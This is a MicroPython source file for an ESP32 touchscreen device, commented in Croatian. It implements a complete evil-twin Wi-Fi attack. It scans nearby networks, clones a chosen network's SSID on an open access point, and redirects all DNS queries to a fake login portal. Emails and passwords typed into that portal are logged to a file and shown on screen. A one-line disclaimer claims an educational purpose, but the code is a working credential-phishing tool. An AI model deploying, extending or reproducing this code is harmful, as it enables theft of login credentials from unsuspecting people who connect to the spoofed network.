# eviltwin.py - Professional Evil Twin Suite (ispravljeno)
# Za edukacijske svrhe / testiranje vlastitih mreža

import machine
import network
import socket
import time
import ubinascii
import gc
import os
import sys
from machine import Pin, SPI

# ========== HARDWARE (isti pinovi kao main.py) ==========
TFT_SCLK, TFT_MOSI, TFT_MISO = 14, 13, 12
TFT_DC, TFT_CS, TFT_RST, TFT_BL = 2, 15, 4, 27
TOUCH_CS, TOUCH_IRQ = 33, 36
TOUCH_X_MIN, TOUCH_X_MAX = 281, 3848
TOUCH_Y_MIN, TOUCH_Y_MAX = 347, 3878
DISPLAY_WIDTH, DISPLAY_HEIGHT, DISPLAY_ROTATION = 320, 240, 180

BG_COLOR = 0x0000
WHITE = 0xFFFF
GREEN = 0x07E0
YELLOW = 0xFFE0
RED = 0xF800
BLUE = 0x001F
PURPLE = 0x780F
GRAY = 0x8410

# ========== INICIJALIZACIJA ==========
sys.path.append('/lib')
try:
    from ili9341 import Display
except:
    print("Greska: nedostaje ili9341")
    machine.reset()

machine.Pin(TFT_BL, machine.Pin.OUT).value(1)
display_spi = SPI(1, baudrate=80000000, sck=Pin(TFT_SCLK), mosi=Pin(TFT_MOSI), miso=Pin(TFT_MISO))
display = Display(display_spi, cs=Pin(TFT_CS), dc=Pin(TFT_DC), rst=Pin(TFT_RST),
                  width=DISPLAY_WIDTH, height=DISPLAY_HEIGHT, rotation=DISPLAY_ROTATION)
display.clear(BG_COLOR)

touch_spi = SPI(1, baudrate=2000000, sck=Pin(14), mosi=Pin(13), miso=Pin(12))
touch_cs = Pin(TOUCH_CS, Pin.OUT, value=1)
touch_irq = Pin(TOUCH_IRQ, Pin.IN)

# ========== POMOĆNE FUNKCIJE ==========
def draw_filled_rect(x, y, w, h, color):
    display.fill_rectangle(x, y, w, h, color)

def safe_draw(x, y, text, color, bg=BG_COLOR):
    try:
        display.draw_text8x8(x, y, str(text)[:(DISPLAY_WIDTH-x)//8], color, bg)
    except:
        pass

def draw_button(x, y, w, h, text, color, filled=False):
    if filled:
        draw_filled_rect(x, y, w, h, color)
        text_color = BG_COLOR
    else:
        display.draw_rectangle(x, y, w, h, color)
        text_color = color
    tw = len(text) * 8
    safe_draw(x + (w - tw)//2, y + (h-8)//2, text, text_color, BG_COLOR if not filled else color)

def get_touch():
    if touch_irq.value() != 0:
        return None, None, 0
    x_raw = citaj_raw(0xD0)
    y_raw = citaj_raw(0x90)
    if not (TOUCH_X_MIN <= x_raw <= TOUCH_X_MAX and TOUCH_Y_MIN <= y_raw <= TOUCH_Y_MAX):
        return None, None, 0
    x = int((x_raw - TOUCH_X_MIN) * DISPLAY_WIDTH / (TOUCH_X_MAX - TOUCH_X_MIN))
    y = int((y_raw - TOUCH_Y_MIN) * DISPLAY_HEIGHT / (TOUCH_Y_MAX - TOUCH_Y_MIN))
    if DISPLAY_ROTATION == 180:
        x = DISPLAY_WIDTH - x
        y = DISPLAY_HEIGHT - y
    return x, y, time.ticks_ms()

def citaj_raw(komanda):
    touch_cs.value(0)
    time.sleep_us(10)
    touch_spi.write(bytearray([komanda]))
    data = touch_spi.read(2)
    touch_cs.value(1)
    if data and len(data) == 2:
        return ((data[0] << 8) | data[1]) >> 3
    return 0

# ========== WIFI SKENIRANJE ==========
def scan_networks():
    sta = network.WLAN(network.STA_IF)
    sta.active(True)
    sta.disconnect()
    time.sleep(0.5)
    nets = sta.scan()
    results = []
    for net in nets:
        ssid = net[0].decode() if net[0] else "<skriven>"
        bssid = ubinascii.hexlify(net[1]).decode()
        channel = net[2]
        rssi = net[3]
        security = net[4]
        sec_txt = ["Open", "WEP", "WPA-PSK", "WPA2-PSK", "WPA/WPA2"][security] if security < 5 else "Other"
        results.append({
            "ssid": ssid,
            "bssid": bssid,
            "channel": channel,
            "rssi": rssi,
            "security": sec_txt,
            "security_code": security
        })
    sta.active(False)
    return sorted(results, key=lambda x: x["rssi"], reverse=True)

# ========== ISPIS LISTE SA SCROLLOM I DUGIM DRŽANJEM ==========
def draw_network_item(network, y, selected):
    bg = PURPLE if selected else BG_COLOR
    draw_filled_rect(0, y, DISPLAY_WIDTH, 28, bg)
    if not network:
        return
    safe_draw(5, y+5, network['ssid'][:25], WHITE if not selected else BG_COLOR, bg)
    rssi_color = GREEN if network['rssi'] > -60 else YELLOW if network['rssi'] > -70 else RED
    safe_draw(250, y+5, f"{network['rssi']}dBm", rssi_color, bg)
    safe_draw(5, y+16, f"CH:{network['channel']} {network['security']}", BLUE if not selected else BG_COLOR, bg)

def select_network_with_scroll(networks):
    if not networks:
        return None
    ITEMS_PER_PAGE = 6
    ITEM_HEIGHT = 28
    LIST_START_Y = 30
    SCROLL_ZONE_TOP = LIST_START_Y
    SCROLL_ZONE_BOTTOM = LIST_START_Y + ITEMS_PER_PAGE * ITEM_HEIGHT
    SCROLL_UP_ZONE = (0, SCROLL_ZONE_TOP, DISPLAY_WIDTH, 20)      # gornji dio za scroll gore
    SCROLL_DOWN_ZONE = (0, SCROLL_ZONE_BOTTOM-20, DISPLAY_WIDTH, 20) # donji dio za scroll dolje

    selected_idx = 0
    scroll_offset = 0
    last_touch_time = 0
    touch_start_xy = None
    touch_start_time = 0
    long_press_triggered = False

    # Dugme Back
    back_rect = (10, 210, 100, 25)

    full_refresh = True

    while True:
        if full_refresh:
            # Iscrtaj zaglavlje
            draw_filled_rect(0, 0, DISPLAY_WIDTH, 20, PURPLE)
            safe_draw(5, 6, "Odaberi WiFi (dugo drzi 3s)", WHITE, PURPLE)
            # Iscrtaj vidljive stavke
            for i in range(ITEMS_PER_PAGE):
                idx = scroll_offset + i
                if idx < len(networks):
                    y_pos = LIST_START_Y + i * ITEM_HEIGHT
                    draw_network_item(networks[idx], y_pos, idx == selected_idx)
                else:
                    draw_filled_rect(0, LIST_START_Y + i*ITEM_HEIGHT, DISPLAY_WIDTH, ITEM_HEIGHT, BG_COLOR)
            # Dugme Back
            draw_button(back_rect[0], back_rect[1], back_rect[2], back_rect[3], "NATRAG", RED, filled=True)
            # Strelice za scroll
            safe_draw(150, LIST_START_Y-12, "^", WHITE)
            safe_draw(150, SCROLL_ZONE_BOTTOM+4, "v", WHITE)
            full_refresh = False

        # Touch polling
        x, y, now = get_touch()
        if x is None:
            # Prekid dugog drzanja ako je prst podignut
            if touch_start_xy:
                touch_start_xy = None
                long_press_triggered = False
            time.sleep_ms(50)
            continue

        # Provjera back button
        if (back_rect[0] <= x <= back_rect[0]+back_rect[2] and
            back_rect[1] <= y <= back_rect[1]+back_rect[3]):
            return None

        # Scroll zone (gore/dolje)
        if SCROLL_UP_ZONE[1] <= y <= SCROLL_UP_ZONE[1]+SCROLL_UP_ZONE[3]:
            if scroll_offset > 0:
                scroll_offset -= 1
                if selected_idx >= scroll_offset+ITEMS_PER_PAGE:
                    selected_idx = scroll_offset+ITEMS_PER_PAGE-1
                full_refresh = True
                time.sleep_ms(200)
            continue
        if SCROLL_DOWN_ZONE[1] <= y <= SCROLL_DOWN_ZONE[1]+SCROLL_DOWN_ZONE[3]:
            if scroll_offset + ITEMS_PER_PAGE < len(networks):
                scroll_offset += 1
                if selected_idx < scroll_offset:
                    selected_idx = scroll_offset
                full_refresh = True
                time.sleep_ms(200)
            continue

        # Provjera je li klik na neku stavku
        for i in range(ITEMS_PER_PAGE):
            idx = scroll_offset + i
            if idx >= len(networks):
                break
            item_y = LIST_START_Y + i * ITEM_HEIGHT
            if item_y <= y <= item_y + ITEM_HEIGHT:
                # Ovo je potencijalna stavka
                if touch_start_xy is None:
                    # Prvi dodir
                    touch_start_xy = (x, y, idx)
                    touch_start_time = now
                    long_press_triggered = False
                    # Odmah označi ovu stavku (promijeni selected_idx)
                    if selected_idx != idx:
                        # Izbriši stari i nacrtaj novi
                        old_idx = selected_idx
                        selected_idx = idx
                        # Refresh samo promijenjenih redaka
                        if old_idx >= scroll_offset and old_idx < scroll_offset+ITEMS_PER_PAGE:
                            old_i = old_idx - scroll_offset
                            draw_network_item(networks[old_idx], LIST_START_Y + old_i*ITEM_HEIGHT, False)
                        if idx >= scroll_offset and idx < scroll_offset+ITEMS_PER_PAGE:
                            new_i = idx - scroll_offset
                            draw_network_item(networks[idx], LIST_START_Y + new_i*ITEM_HEIGHT, True)
                    else:
                        # Već odabrana, samo nastavi
                        pass
                else:
                    # Već držimo prst – provjeri je li ista stavka
                    if touch_start_xy[2] == idx:
                        elapsed = time.ticks_diff(now, touch_start_time)
                        if elapsed >= 3000 and not long_press_triggered:
                            # Dugo držanje – odaberi mrežu
                            long_press_triggered = True
                            return networks[idx]
                    else:
                        # Promijenjena stavka – resetiraj dugo držanje
                        touch_start_xy = (x, y, idx)
                        touch_start_time = now
                        long_press_triggered = False
                        # Update selected_idx
                        old_idx = selected_idx
                        selected_idx = idx
                        if old_idx >= scroll_offset and old_idx < scroll_offset+ITEMS_PER_PAGE:
                            old_i = old_idx - scroll_offset
                            draw_network_item(networks[old_idx], LIST_START_Y + old_i*ITEM_HEIGHT, False)
                        if idx >= scroll_offset and idx < scroll_offset+ITEMS_PER_PAGE:
                            new_i = idx - scroll_offset
                            draw_network_item(networks[idx], LIST_START_Y + new_i*ITEM_HEIGHT, True)
                break
        else:
            # Kliknuto izvan stavki – resetiraj touch
            touch_start_xy = None
            long_press_triggered = False

        time.sleep_ms(50)

# ========== EVIL TWIN AP I PORTAL ==========
captured_creds = []
dns_socket = None
http_socket = None

def start_evil_twin(target):
    global captured_creds
    ssid = target['ssid']
    # Ograniči kanal na 1-11
    channel = max(1, min(11, target['channel']))

    # Isključi sve
    sta = network.WLAN(network.STA_IF)
    sta.active(False)
    ap = network.WLAN(network.AP_IF)
    ap.active(False)
    time.sleep(0.5)
    try:
        # Otvorena mreža (authmode=0)
        ap.config(essid=ssid, authmode=0, channel=channel)
        ap.active(True)
        ap.ifconfig(('192.168.4.1', '255.255.255.0', '192.168.4.1', '8.8.8.8'))
    except Exception as e:
        print("Greska pri kreiranju AP:", e)
        return False

    print(f"Evil Twin AP pokrenut: {ssid} na kanalu {channel}")
    # Pokreni DNS i HTTP servere
    start_dns_server()
    start_http_server()
    # Prikaz statusa
    run_status_loop(ap, target)
    return True

def start_dns_server():
    global dns_socket
    dns_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    dns_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    dns_socket.setblocking(False)
    dns_socket.bind(('0.0.0.0', 53))

def start_http_server():
    global http_socket
    http_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    http_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    http_socket.setblocking(False)
    http_socket.bind(('0.0.0.0', 80))
    http_socket.listen(5)

def handle_requests():
    global dns_socket, http_socket, captured_creds
    # DNS
    try:
        data, addr = dns_socket.recvfrom(512)
        # Jednostavan odgovor: sve domene -> 192.168.4.1
        reply = b'\x00\x00\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00' + data[12:] + b'\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x00\x00\x04' + socket.inet_aton('192.168.4.1')
        dns_socket.sendto(reply, addr)
    except:
        pass
    # HTTP
    try:
        cl, addr = http_socket.accept()
        request = cl.recv(1024).decode()
        if 'POST /login' in request:
            try:
                body = request.split('\r\n\r\n')[1]
                params = {}
                for pair in body.split('&'):
                    if '=' in pair:
                        k, v = pair.split('=', 1)
                        params[k] = v
                email = params.get('email', '')
                pwd = params.get('password', '')
                if email and pwd:
                    t = time.localtime()
                    ts = f"{t[2]}.{t[1]}.{t[0]}. {t[3]}:{t[4]}:{t[5]}"
                    cred = f"[{ts}] Email: {email} | Pass: {pwd}\n"
                    with open('captured.txt', 'a') as f:
                        f.write(cred)
                    captured_creds.append(cred)
                    print("Uhvaceno:", cred)
            except:
                pass
            response = b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html><body><h2>Hvala!</h2><p>Sada imate pristup.</p></body></html>"
            cl.send(response)
        else:
            html = """<!DOCTYPE html>
            <html>
            <head><title>WiFi prijava</title><meta name="viewport" content="width=device-width">
            <style>body{font-family:Arial;text-align:center;padding:20px;} input{width:90%%;padding:10px;margin:10px;} button{background:#4CAF50;color:white;padding:10px;}</style>
            </head>
            <body><h2>Prijava na WiFi</h2>
            <form action="/login" method="post">
            <input type="email" name="email" placeholder="Email" required><br>
            <input type="password" name="password" placeholder="Lozinka" required><br>
            <button type="submit">Prijavi se</button>
            </form></body></html>"""
            response = f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n{html}"
            cl.send(response.encode())
        cl.close()
    except:
        pass

def run_status_loop(ap, target):
    global captured_creds
    last_clients = -1
    last_creds = -1
    exit_button = (110, 210, 100, 25)
    
    draw_button(exit_button[0], exit_button[1], exit_button[2], exit_button[3], "IZLAZ", RED, filled=True)

    while True:
        # Dohvati spojene klijente
        try:
            clients = ap.status('stations')
            num_clients = len(clients)
        except:
            num_clients = 0
        num_creds = len(captured_creds)
        # Ažuriraj samo promijenjene dijelove
        if num_clients != last_clients:
            draw_filled_rect(0, 60, 200, 12, BG_COLOR)
            safe_draw(5, 60, f"Spojenih klijenata: {num_clients}", YELLOW)
            last_clients = num_clients
        if num_creds != last_creds:
            draw_filled_rect(0, 80, 200, 12, BG_COLOR)
            safe_draw(5, 80, f"Uhvacenih kredencijala: {num_creds}", BLUE)
            # Iscrtaj zadnje 3
            draw_filled_rect(0, 100, DISPLAY_WIDTH, 80, BG_COLOR)
            for i, cred in enumerate(captured_creds[-3:]):
                safe_draw(5, 100 + i*12, cred[:45], WHITE)
            last_creds = num_creds
        # Touch
        x, y, _ = get_touch()
        if x is not None and exit_button[0] <= x <= exit_button[0]+exit_button[2] and exit_button[1] <= y <= exit_button[1]+exit_button[3]:
            break
        # Obradi zahtjeve
        handle_requests()
        gc.collect()
        time.sleep_ms(100)
    # Gasenje
    ap.active(False)
    try:
        dns_socket.close()
        http_socket.close()
    except:
        pass

# ========== GLAVNA FUNKCIJA ==========
def main():
    display.clear(BG_COLOR)
    safe_draw(50, 100, "Pokrecem Evil Twin...", GREEN)
    time.sleep(1)
    # Skeniraj mreze
    networks = scan_networks()
    if not networks:
        display.clear(BG_COLOR)
        safe_draw(50, 100, "Nema dostupnih mreza!", RED)
        safe_draw(60, 140, "Vracam se...", WHITE)
        time.sleep(2)
        return
    target = select_network_with_scroll(networks)
    if target is None:
        display.clear(BG_COLOR)
        safe_draw(50, 100, "Odustali ste.", WHITE)
        time.sleep(1.5)
        return
    # Prikazi podatke o meti
    display.clear(BG_COLOR)
    draw_filled_rect(0, 0, DISPLAY_WIDTH, 20, PURPLE)
    safe_draw(5, 6, "Podaci o odabranoj mrezi", WHITE, PURPLE)
    safe_draw(5, 30, f"SSID: {target['ssid']}", GREEN)
    safe_draw(5, 45, f"BSSID: {target['bssid']}", WHITE)
    safe_draw(5, 60, f"Kanal: {target['channel']}", WHITE)
    safe_draw(5, 75, f"Signal: {target['rssi']} dBm", YELLOW)
    safe_draw(5, 90, f"Enkripcija: {target['security']}", BLUE)
    safe_draw(5, 110, "Pokrecem Evil Twin za 3 sec...", WHITE)
    time.sleep(3)
    if start_evil_twin(target):
        display.clear(BG_COLOR)
        safe_draw(50, 100, "Evil Twin ugasen.", GREEN)
        time.sleep(1.5)
    else:
        display.clear(BG_COLOR)
        safe_draw(30, 100, "Greska pri pokretanju AP!", RED)
        time.sleep(2)

if __name__ == "__main__":
    main()
